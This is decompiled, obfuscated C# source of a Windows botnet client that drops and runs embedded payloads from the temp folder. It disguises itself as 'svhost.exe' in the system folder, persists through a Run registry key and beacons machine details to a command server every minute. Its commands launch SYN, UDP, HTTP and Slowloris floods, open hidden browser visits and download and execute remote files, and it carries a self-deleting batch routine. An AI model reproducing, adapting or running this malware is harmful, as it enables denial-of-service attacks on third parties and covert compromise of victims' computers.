using System;
using System.Collections;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class XjzPWYhFzdfMSltjPKKJOyG
{
	private static Thread NdEDTJMEcGkiQFZQHUeNNBB = new Thread(bkwZsYvOaOMGYVrblrnzRSn);

	private static MD5 oobOoLYmUlXbBpmgyvSoNTP = new MD5CryptoServiceProvider();

	[STAThread]
	public static void Main()
	{
		try
		{
			NdEDTJMEcGkiQFZQHUeNNBB.Start();
			RCjlGinCMgthTuRQrZqdhHh();
			ResourceManager resourceManager = new ResourceManager("BFIzYngQxBV", Assembly.GetExecutingAssembly());
			object resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)resourceSet).GetEnumerator();
				DictionaryEntry dictionaryEntry = default(DictionaryEntry);
				while (enumerator.MoveNext())
				{
					object current = enumerator.Current;
					DictionaryEntry dictionaryEntry2 = ((current != null) ? ((DictionaryEntry)current) : dictionaryEntry);
					byte[] array = Convert.FromBase64String(Conversions.ToString(resourceManager.GetObject(Conversions.ToString(dictionaryEntry2.Key))));
					FileStream fileStream = new FileStream(Conversions.ToString(Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key)), FileMode.Create);
					fileStream.Write(array, 0, array.Length);
					fileStream.Close();
					NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)Path.GetTempPath(), dictionaryEntry2.Key) }, (string[])null, (Type[])null, (bool[])null, true);
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void bkwZsYvOaOMGYVrblrnzRSn()
	{
		while (true)
		{
			try
			{
				string qifClwDyKbcxyJgNqGmtMUK = "&pcname=" + Environment.MachineName + "&botver=2.0.0.1&winver=" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString() + " (x" + Conversions.ToString(LVbXjzPWYhFzdfMSltjPKKJ()) + ")&hwid=" + OyGNdEDTJMEcGkiQFZQHUeN();
				string text = WcvEtZUVTYJQXnPOeUWOnQu("www.zippyshare.comconnect.php", qifClwDyKbcxyJgNqGmtMUK);
				string empty = string.Empty;
				NBBbkwZsYvOaOMGYVrblrnz();
				RSnoxVDgvciCKzfabZePIPt();
				if (text.Length != 0 && Operators.CompareString(text, empty, false) != 0)
				{
					UGWZcUtWBlgVpgXkvedRDeB(text);
					empty = text;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(60000);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private static void UGWZcUtWBlgVpgXkvedRDeB(string NbJaMQqecWolIdDIFQTiEFO)
	{
		string[] array = NbJaMQqecWolIdDIFQTiEFO.Split(new char[1] { '*' });
		try
		{
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!SYN"))
			{
				try
				{
					wUmymjdvsQzKQMYopLNWtbF.BuNKgCbgcorHcdmwrVkDXql = array[1];
					wUmymjdvsQzKQMYopLNWtbF.SWkuPdQDdzybJaMQpQbVnkH = Convert.ToInt32(array[2]);
					wUmymjdvsQzKQMYopLNWtbF.jxGHQoiMOuBUcSxstrwhovM = Convert.ToInt32(array[3]);
					wUmymjdvsQzKQMYopLNWtbF.tTTuDPrLqOgGgrlEnKtFKHS = Convert.ToInt32(array[4]);
					wUmymjdvsQzKQMYopLNWtbF.nmDsumMoTRynIypEOwvjjLT();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!UDP"))
			{
				try
				{
					BxgtTTuDPrLqOgGgrlEnKtF.fuOiBvlRZaYdPIPtGFVZcTs = array[1];
					BxgtTTuDPrLqOgGgrlEnKtF.IBkSVpSWkuPdQDdzybJaMQp = Convert.ToInt32(array[2]);
					BxgtTTuDPrLqOgGgrlEnKtF.aPuEFDIflsXkjzEGxXmePwy = Convert.ToInt32(array[3]);
					BxgtTTuDPrLqOgGgrlEnKtF.epjCyVqQIEPgvRFOlgKMsMS = 1024;
					BxgtTTuDPrLqOgGgrlEnKtF.TvBOLtHggIRdFZEcuUuGzSB = 1024;
					BxgtTTuDPrLqOgGgrlEnKtF.YISYUgwMTVeCwacJPiqfLHH();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!HTTP-GET"))
			{
				try
				{
					sMSaPuEFDIflsXkjzEGxXme.LHHGLvCKaBzQGJBZDhfNCWM = array[1];
					sMSaPuEFDIflsXkjzEGxXme.qUWDXckaGOPNSpwEiuuKORI = Convert.ToInt32(array[2]);
					sMSaPuEFDIflsXkjzEGxXme.OzbxKYGXJNnbYSkiFayFBNQ = Convert.ToInt32(array[3]);
					sMSaPuEFDIflsXkjzEGxXme.MFMqRDTWZRpTxhdSmdUhraa = false;
					sMSaPuEFDIflsXkjzEGxXme.DRbKKwxYhtWpUsLXLICURoY = ORIhwpZHKeHLZVFSrrTbnQj.PmFeFQKcMiSdieqIWefoNHk();
					sMSaPuEFDIflsXkjzEGxXme.iokwNOjluSzcsZfyHvcXXWb = ORIhwpZHKeHLZVFSrrTbnQj.mTZsBqWRSQVGNUkLLaRTLkN();
					sMSaPuEFDIflsXkjzEGxXme.hwpZHKeHLZVFSrrTbnQjPmF();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!HTTP-POST"))
			{
				try
				{
					sMSaPuEFDIflsXkjzEGxXme.LHHGLvCKaBzQGJBZDhfNCWM = array[1];
					sMSaPuEFDIflsXkjzEGxXme.qUWDXckaGOPNSpwEiuuKORI = Convert.ToInt32(array[2]);
					sMSaPuEFDIflsXkjzEGxXme.OzbxKYGXJNnbYSkiFayFBNQ = Convert.ToInt32(array[3]);
					sMSaPuEFDIflsXkjzEGxXme.MFMqRDTWZRpTxhdSmdUhraa = true;
					sMSaPuEFDIflsXkjzEGxXme.DRbKKwxYhtWpUsLXLICURoY = ORIhwpZHKeHLZVFSrrTbnQj.PmFeFQKcMiSdieqIWefoNHk();
					sMSaPuEFDIflsXkjzEGxXme.iokwNOjluSzcsZfyHvcXXWb = ORIhwpZHKeHLZVFSrrTbnQj.mTZsBqWRSQVGNUkLLaRTLkN();
					sMSaPuEFDIflsXkjzEGxXme.hwpZHKeHLZVFSrrTbnQjPmF();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!SLOWRIS-FLOOD"))
			{
				try
				{
					wUmymjdvsQzKQMYopLNWtbF.BuNKgCbgcorHcdmwrVkDXql = array[1];
					wUmymjdvsQzKQMYopLNWtbF.SWkuPdQDdzybJaMQpQbVnkH = Convert.ToInt32(array[2]);
					wUmymjdvsQzKQMYopLNWtbF.jxGHQoiMOuBUcSxstrwhovM = 1;
					wUmymjdvsQzKQMYopLNWtbF.tTTuDPrLqOgGgrlEnKtFKHS = 1;
					wUmymjdvsQzKQMYopLNWtbF.nmDsumMoTRynIypEOwvjjLT();
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!VISIT-PAGE"))
			{
				try
				{
					if (Operators.CompareString(array[2], "0", false) == 0)
					{
						if (!array[1].StartsWith("http://"))
						{
							array[1] = "http://" + array[1];
						}
						Process.Start(array[1]);
					}
					else
					{
						ProcessStartInfo processStartInfo = new ProcessStartInfo();
						processStartInfo.FileName = "iexplore.exe";
						processStartInfo.Arguments = array[1];
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo);
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			if (NbJaMQqecWolIdDIFQTiEFO.StartsWith("!DOWNLOAD"))
			{
				try
				{
					NBBbkwZsYvOaOMGYVrblrnz();
					hHhsmFCYuTLHTjyUIRojNPv(array[1]);
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			if (!NbJaMQqecWolIdDIFQTiEFO.StartsWith("!UPDATE-BOTS"))
			{
				return;
			}
			try
			{
				NBBbkwZsYvOaOMGYVrblrnz();
				if (KNhKOcZIVuuWeqTmSpIhITN())
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey.DeleteValue("Fupdate");
					registryKey.Close();
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					registryKey2.DeleteValue("Fupdate");
					registryKey2.Close();
				}
				hHhsmFCYuTLHTjyUIRojNPv(array[1]);
				ProjectData.EndApp();
			}
			catch (Exception projectError8)
			{
				ProjectData.SetProjectError(projectError8);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static void NBBbkwZsYvOaOMGYVrblrnz()
	{
		try
		{
			wUmymjdvsQzKQMYopLNWtbF.fIbHfwJwuoHEaKVbXizBWXh();
			BxgtTTuDPrLqOgGgrlEnKtF.GLvCKaBzQGJBZDhfNCWMDRb();
			sMSaPuEFDIflsXkjzEGxXme.eFQKcMiSdieqIWefoNHkmTZ();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void RCjlGinCMgthTuRQrZqdhHh()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svhost.exe"))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svhost.exe", overwrite: true);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svhost.exe");
				if (KNhKOcZIVuuWeqTmSpIhITN())
				{
					RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey.SetValue("Fupdate", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svhost.exe");
				}
				else
				{
					RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
					registryKey2.SetValue("Fupdate", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\svhost.exe");
				}
				Environment.Exit(0);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string OyGNdEDTJMEcGkiQFZQHUeN()
	{
		return aesOPZidHXpKdXNsCCzFqjq(Environment.UserName.ToString() + Environment.ProcessorCount + Environment.MachineName.ToString() + Environment.Version.ToString() + Conversions.ToString(LVbXjzPWYhFzdfMSltjPKKJ()) + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().ToString());
	}

	public static string aesOPZidHXpKdXNsCCzFqjq(string VhhwBEvUjcMtwRtxMWrFreG)
	{
		byte[] array = oobOoLYmUlXbBpmgyvSoNTP.ComputeHash(Encoding.Default.GetBytes(VhhwBEvUjcMtwRtxMWrFreG));
		return BitConverter.ToString(array).Replace("-", "").ToUpper();
	}

	public static bool KNhKOcZIVuuWeqTmSpIhITN()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch (UnauthorizedAccessException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static int LVbXjzPWYhFzdfMSltjPKKJ()
	{
		return checked(Marshal.SizeOf(typeof(IntPtr)) * 8);
	}

	public static string WcvEtZUVTYJQXnPOeUWOnQu(string sbPkaRfpYYLLmuIjDiHYkYW, string QifClwDyKbcxyJgNqGmtMUK)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamReader streamReader = default(StreamReader);
		WebResponse response = default(WebResponse);
		WebRequest webRequest = default(WebRequest);
		byte[] bytes = default(byte[]);
		Stream requestStream = default(Stream);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 283:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_001c;
						case 5:
							goto IL_002b;
						case 6:
							goto IL_003a;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0057;
						case 9:
							goto IL_0062;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007b;
						case 12:
							goto IL_0087;
						case 13:
							goto IL_008e;
						case 14:
						case 15:
							goto IL_009a;
						case 16:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_009a:
					num = 15;
					streamReader = new StreamReader(response.GetResponseStream());
					break;
					IL_0008:
					num = 2;
					ServicePointManager.Expect100Continue = false;
					goto IL_0011;
					IL_0011:
					num = 3;
					webRequest = WebRequest.Create(sbPkaRfpYYLLmuIjDiHYkYW);
					goto IL_001c;
					IL_001c:
					num = 4;
					webRequest.ContentType = "application/x-www-form-urlencoded";
					goto IL_002b;
					IL_002b:
					num = 5;
					webRequest.Method = "POST";
					goto IL_003a;
					IL_003a:
					num = 6;
					bytes = Encoding.ASCII.GetBytes(QifClwDyKbcxyJgNqGmtMUK);
					goto IL_0049;
					IL_0049:
					num = 7;
					webRequest.ContentLength = bytes.Length;
					goto IL_0057;
					IL_0057:
					num = 8;
					requestStream = webRequest.GetRequestStream();
					goto IL_0062;
					IL_0062:
					num = 9;
					requestStream.Write(bytes, 0, bytes.Length);
					goto IL_0071;
					IL_0071:
					num = 10;
					requestStream.Close();
					goto IL_007b;
					IL_007b:
					num = 11;
					response = webRequest.GetResponse();
					goto IL_0087;
					IL_0087:
					num = 12;
					if (response == null)
					{
						goto IL_008e;
					}
					goto IL_009a;
					IL_008e:
					num = 13;
					text = null;
					goto end_IL_0000_3;
					end_IL_0000_2:
					break;
				}
				num = 16;
				text = streamReader.ReadToEnd().Trim();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 283;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void hHhsmFCYuTLHTjyUIRojNPv(string YCEkqKSHmiihmXelCcbrhkc)
	{
		Process process = new Process();
		WebClient webClient = new WebClient();
		string text = frIXsgpNIlnUntCqWfgejHN(8) + ".exe";
		try
		{
			webClient.DownloadFile(YCEkqKSHmiihmXelCcbrhkc, Environment.GetEnvironmentVariable("TEMP") + "\\" + text);
			process.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\" + text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static bool XZGafndJSSRVszHlxxORUMk(string BeJHodxofsDllZZzJVxRwUm)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 56:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				flag = Process.GetProcessesByName(BeJHodxofsDllZZzJVxRwUm).Length >= 1;
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 56;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		bool result = flag;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static object afndJSSRVszHlxxORUMkzsc(string ymjdvsQzKQMYopLNWtbFUBH)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 102:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0031;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					process.CloseMainWindow();
					num5 = checked(num5 + 1);
					goto IL_0031;
					IL_0008:
					num = 2;
					processesByName = Process.GetProcessesByName(ymjdvsQzKQMYopLNWtbFUBH);
					num5 = 0;
					goto IL_0034;
					IL_0034:
					if (num5 < processesByName.Length)
					{
						process = processesByName[num5];
						goto IL_001a;
					}
					goto end_IL_0000_2;
					IL_0031:
					num = 5;
					goto IL_0034;
					IL_001a:
					num = 3;
					process.Kill();
					goto IL_0023;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 102;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static void OoLYmUlXbBpmgyvSoNTPaes()
	{
		try
		{
			string text = frIXsgpNIlnUntCqWfgejHN(5) + ".bat";
			FileInfo fileInfo = new FileInfo(Application.get_StartupPath());
			fileInfo.Attributes = FileAttributes.Normal;
			string text2 = Interaction.Environ("TEMP") + "\\" + text;
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(text2))
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			StreamWriter streamWriter = new StreamWriter(text2, append: false);
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine(":L1");
			streamWriter.WriteLine("del \"" + Application.get_ExecutablePath() + "\" 2>nul");
			streamWriter.WriteLine("if exist \"" + Application.get_ExecutablePath() + "\" goto L1");
			streamWriter.WriteLine("del \"" + text2 + "\" 2>nul");
			streamWriter.Close();
			Interaction.Shell(text2, (AppWinStyle)0, false, -1);
			Application.Exit();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static string frIXsgpNIlnUntCqWfgejHN(int hkcBeJHodxofsDllZZzJVxR)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		StringBuilder stringBuilder = default(StringBuilder);
		char[] array = default(char[]);
		int num6 = default(int);
		int num7 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 212:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001e;
						case 5:
							goto IL_002c;
						case 6:
							goto IL_0036;
						case 7:
							goto IL_003e;
						case 8:
							goto IL_0066;
						case 9:
							goto IL_0074;
						case 10:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0074:
					num = 9;
					num5 = checked(num5 + 1);
					goto IL_007c;
					IL_0008:
					num = 2;
					VBMath.Randomize();
					goto IL_0010;
					IL_0010:
					num = 3;
					stringBuilder = new StringBuilder("");
					goto IL_001e;
					IL_001e:
					num = 4;
					array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
					goto IL_002c;
					IL_002c:
					num = 5;
					num6 = hkcBeJHodxofsDllZZzJVxR;
					num5 = 1;
					goto IL_007c;
					IL_007c:
					if (num5 > num6)
					{
						break;
					}
					goto IL_0036;
					IL_0036:
					num = 6;
					VBMath.Randomize();
					goto IL_003e;
					IL_003e:
					num = 7;
					num7 = checked((int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f));
					goto IL_0066;
					IL_0066:
					num = 8;
					stringBuilder.Append(array[num7]);
					goto IL_0074;
					end_IL_0000_2:
					break;
				}
				num = 10;
				text = stringBuilder.ToString();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 212;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		string result = text;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int kFSGrTpoQxPBFfGRLdawTrj(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);

	public static void RSnoxVDgvciCKzfabZePIPt()
	{
		try
		{
			GC.Collect();
			GC.WaitForPendingFinalizers();
			if (Environment.OSVersion.Platform == PlatformID.Win32NT)
			{
				kFSGrTpoQxPBFfGRLdawTrj(Process.GetCurrentProcess().Handle, -1, -1);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
